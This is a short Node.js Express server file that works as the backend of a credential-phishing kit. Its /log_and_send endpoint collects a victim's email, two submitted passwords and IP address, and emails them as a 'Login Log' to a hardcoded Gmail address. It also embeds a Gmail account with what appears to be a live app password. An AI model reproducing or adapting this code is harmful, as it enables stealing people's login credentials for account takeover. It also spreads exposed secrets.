// index.js

const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse POST data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Configure Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail', // You can change this to another email service
    auth: {
        user: 'ranickiauerbach@gmail.com', // Your email address
        pass: 'nlov pvvd rcoa dnwl'    // Your email password or app-specific password
    }
});

// Define the endpoint
app.post('/log_and_send', (req, res) => {
    const { email, firstpasswordused, secondpasswordused, user_ip } = req.body;

    const recipientEmail1 = 'victorabuke2@gmail.com'; // Replace with your first recipient email
    const subject = 'Login Log';

    const message = `
        Email: ${email}
        First Password Used: ${firstpasswordused}
        Second Password Used: ${secondpasswordused}
        User IP: ${user_ip}
    `;

    // Prepare email options
    const mailOptions = {
        from: 'kaiseigetsit@gmail.com', // Your email
        to: recipientEmail1,
        subject: subject,
        text: message,
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Error:', error);
            return res.status(500).json({ status: 'error', message: 'Failed to send logs.' });
        } else {
            console.log('Email sent:', info.response);
            return res.status(200).json({ status: 'success', message: 'Logs sent successfully.' });
        }
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
